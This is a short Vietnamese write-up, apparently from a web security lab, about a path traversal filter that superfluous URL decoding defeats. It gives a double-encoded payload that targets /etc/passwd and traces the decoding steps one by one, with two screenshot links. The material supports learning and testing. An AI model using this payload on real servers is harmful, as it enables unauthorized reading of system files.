## Duyệt qua đường dẫn tệp, trình tự duyệt bị loại bỏ bằng giải mã URL thừa 
* <img width="1089" height="466" alt="image" src="https://github.com/user-attachments/assets/1242553b-6a05-41e2-b1b1-21dbfac61381" />
* <img width="1081" height="522" alt="image" src="https://github.com/user-attachments/assets/7d6b6d49-319c-48b9-8e71-1280aa570a1e" />
* Đầu vào `filename=..%252F..%252F..%252Fetc%2Fpasswd`
* Máy chủ nó giải mã `%25` thành `%`
* Máy chủ nó giải mã `%2F` thành `/`
* Sau khi giải mã nó sẽ được `..%2F..%2F..%2Fetc/passwd`
* Nó sẽ tiếp tục giải mã chuỗi trên và trả về `../../../etc/passwd`

